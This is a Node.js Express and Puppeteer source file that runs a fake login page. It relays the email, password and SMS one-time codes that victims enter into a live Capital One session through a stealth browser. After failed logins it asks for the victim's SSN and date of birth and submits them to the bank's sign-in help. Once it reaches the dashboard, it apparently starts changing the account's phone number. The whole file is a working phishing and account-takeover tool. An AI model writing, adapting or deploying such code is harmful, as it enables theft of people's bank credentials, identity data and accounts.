const express = require("express");
const bodyParser = require("body-parser");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");

// Add stealth plugin to Puppeteer
puppeteer.use(StealthPlugin());

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// Track invalid login attempts globally
let invalidAttempts = 0;
let browser, page;

// Route: Serve the login form
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Login</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 2rem auto;
            text-align: center;
          }
          input, button {
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-size: 1rem;
          }
          button {
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
          }
          button:hover {
            background-color: #0056b3;
          }
        </style>
      </head>
      <body>
        <h1>Login</h1>
        <form action="/submit-login" method="POST">
          <label>Email: <input type="text" name="email" required /></label><br/>
          <label>Password: <input type="password" name="password" required /></label><br/>
          <button type="submit">Log in</button>
        </form>
      </body>
    </html>
  `);
});

// Route: Handle login form submission
app.post("/submit-login", async (req, res) => {
  const { email, password } = req.body;

  try {
    // Launch Puppeteer browser if not already launched
    if (!browser) {
      browser = await puppeteer.launch({
        headless: false,
        args: ["--no-sandbox", "--disable-setuid-sandbox"],
      });
      page = await browser.newPage();
    }
    

    console.log(`Server running00`);
    // Navigate to the Capital One login page if not already loaded
    if (page.url() !== "https://apps.emaillistverify.com/users/login") {
      await page.goto("https://apps.emaillistverify.com/users/login", { waitUntil: "networkidle2", timeout: 60000 });
    }
    

    console.log(`Server running001`);
    // Clear cookies and cache explicitly
    const client = await page.target().createCDPSession();
    await client.send("Network.clearBrowserCookies");
    await client.send("Network.clearBrowserCache");

    // Clear the input fields before typing
    await page.evaluate(() => {
      // Clear the email input field
      const emailField = document.querySelector('input#username');
      if (emailField) emailField.value = '';

      // Clear the password input field
      const passwordField = document.querySelector('input#password');
      if (passwordField) passwordField.value = '';
    });
    

    console.log(`Server running002`);
    // Type the login credentials
    await page.type('input#username', email, { delay: 100 });
    await page.type('input#password', password, { delay: 100 });

    console.log(`Server running004`);

    // Click the login button
    await page.evaluate(() => {
      const button = document.querySelector('button#noAcctSubmit');
      if (button) button.click();
    });

    // Wait for navigation after login attempt
    await page.waitForNavigation({ waitUntil: "networkidle2" });

    // Check for login success
    const loginSuccess = await page.evaluate(() => {
      const element = document.querySelector('div.option-list-entry--message > p.message--header');
      return element && element.textContent.trim() === 'Text me a temporary code';
    });

    if (loginSuccess) {
      // Successful login
      invalidAttempts = 0; // Reset invalid attempts

      // Click "Text me a temporary code"
      await page.click('div.option-list-entry--message > p.message--header');
      
     

      // Wait for "Send me the code" button
      await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
      await page.click('button[data-testtarget="otp-button"]');

      // Render the OTP input form
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Enter OTP</title>
            <style>
              body { font-family: Arial, sans-serif; max-width: 500px; margin: 2rem auto; text-align: center; }
              input, button { padding: 0.5rem; margin: 0.5rem 0; font-size: 1rem; }
              button { background-color: #007bff; color: #fff; border: none; cursor: pointer; }
              button:hover { background-color: #0056b3; }
            </style>
          </head>
          <body>
            <h1>Enter OTP</h1>
            <form action="/submit-otp" method="POST">
              <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
              <button type="submit">Submit OTP</button>
            </form>
          </body>
        </html>
      `);
    } else {
      // Unsuccessful login handling
      invalidAttempts++;

      if (invalidAttempts === 1) {
        // First invalid attempt: Render the login form again with a message
        res.send(`
          <!DOCTYPE html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Invalid Login</title>
              <style>
                body {
                  font-family: Arial, sans-serif;
                  max-width: 500px;
                  margin: 2rem auto;
                  text-align: center;
                }
                input, button {
                  padding: 0.5rem;
                  margin: 0.5rem 0;
                  font-size: 1rem;
                }
                button {
                  background-color: #007bff;
                  color: #fff;
                  border: none;
                  cursor: pointer;
                }
                button:hover {
                  background-color: #0056b3;
                }
              </style>
            </head>
            <body>
              <h1>Invalid Login Attempt</h1>
              <p>Your login details are incorrect. Please try again.</p>
              <form action="/submit-login" method="POST">
                <label>Email: <input type="text" name="email" required /></label><br/>
                <label>Password: <input type="password" name="password" required /></label><br/>
                <button type="submit">Log in</button>
              </form>
            </body>
          </html>
        `);
      } else if (invalidAttempts === 2) {
        // Second invalid attempt: Navigate to sign-in help
        await page.goto("https://verified.capitalone.com/sign-in-help/", { waitUntil: "networkidle2" });

        // Serve the contact form
        res.send(`
          <!DOCTYPE html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Contact Information</title>
              <style>
                body {
                  font-family: Arial, sans-serif;
                  max-width: 500px;
                  margin: 2rem auto;
                  text-align: center;
                }
                input, button {
                  padding: 0.5rem;
                  margin: 0.5rem 0;
                  font-size: 1rem;
                }
                button {
                  background-color: #007bff;
                  color: #fff;
                  border: none;
                  cursor: pointer;
                }
                button:hover {
                  background-color: #0056b3;
                }
              </style>
            </head>
            <body>
              <h1>Contact Information</h1>
              <form action="/submit-contact" method="POST">
                <label>Last Name: <input type="text" name="lastname" required /></label><br/>
                <label>SSN: <input type="password" name="ssn" required /></label><br/>
                <label>Date of Birth: <input type="text" name="dob" required placeholder="mm/dd/yyyy" /></label><br/>
                <button type="submit">Find Me</button>
              </form>
            </body>
          </html>
        `);
      } else {
        // Third invalid attempt or more: Lockout response
        res.send("<h1>Too many invalid attempts. Please try again later.</h1>");
      }
    }
  } catch (error) {
    console.error("Error during login:", error);
    res.status(500).send("<h1>An error occurred during login.</h1>");
  }
});

// Route: Handle contact form submission
app.post("/submit-contact", async (req, res) => {
  const { lastname, ssn, dob } = req.body;

  try {
    // Fill the contact form fields on the Puppeteer browser page
    await page.type('input#lastname', lastname, { delay: 100 });
    await page.type('input#fullSSN', ssn, { delay: 100 });
    await page.type('input#dob', dob, { delay: 100 });

    // Click the "Find Me" button
    await Promise.all([
      page.click('#find-me-button'),
      page.waitForNavigation({ waitUntil: "networkidle2" }),
    ]);

    res.send("<h1>Contact details submitted successfully!</h1>");
  } catch (error) {
    console.error("Error submitting contact details:", error);
    res.status(500).send("<h1>An error occurred while submitting contact details.</h1>");
  }
});


// Route: Handle OTP submission
app.post("/submit-otp", async (req, res) => {
  const { otp } = req.body;

  try {
    // Input OTP into Puppeteer session
    await page.type('input#pinEntry', otp, { delay: 100 });

    // Click "Submit Code" button
    await page.click('button[data-testtarget="otp-submit"]');
    await page.waitForNavigation({ waitUntil: "networkidle2" });

    await page.waitForNavigation({ waitUntil: "networkidle2" });


    // Check if we're on the dashboard
    const onDashboard = await page.evaluate(() => {
      const element = document.querySelector('div#recentTransactionsSection');
      return element && element.textContent.includes('Recent Transactions');
    });

    if (onDashboard) {
      // Navigate to Profile
      await page.goto("https://myaccounts.capitalone.com/Profile", { waitUntil: "networkidle2" });

      // Click "Edit Work" button
      await page.click('a.phone-edit-click[aria-label="Edit Work"]');
      await page.waitForNavigation({ waitUntil: "networkidle2" });

      // Check for "Text me a temporary code" option
      const codeOptionExists = await page.evaluate(() => {
        const element = document.querySelector('div.option-list-entry--message > p.message--header');
        return element && element.textContent.trim() === 'Text me a temporary code';
      });

      if (codeOptionExists) {
        // Click the option and resend the code
        await page.click('div.option-list-entry--message > p.message--header');

        await page.waitForNavigation({ waitUntil: "networkidle2" });

        await page.click('button[data-testtarget="otp-button"]');

        // Render new OTP input form
        res.send(`
          <!DOCTYPE html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Enter OTP</title>
              <style>
                body { font-family: Arial, sans-serif; max-width: 500px; margin: 2rem auto; text-align: center; }
                input, button { padding: 0.5rem; margin: 0.5rem 0; font-size: 1rem; }
                button { background-color: #007bff; color: #fff; border: none; cursor: pointer; }
                button:hover { background-color: #0056b3; }
              </style>
            </head>
            <body>
              <h1>Enter OTP</h1>
              <form action="/submit-otp" method="POST">
                <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
                <button type="submit">Submit OTP</button>
              </form>
            </body>
          </html>
        `);
      }
    } else {
      res.send("<h1>Failed to access the dashboard. Please try again.</h1>");
    }
  } catch (error) {
    console.error("Error during OTP submission:", error);
    res.status(500).send("<h1>An error occurred while processing your OTP.</h1>");
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});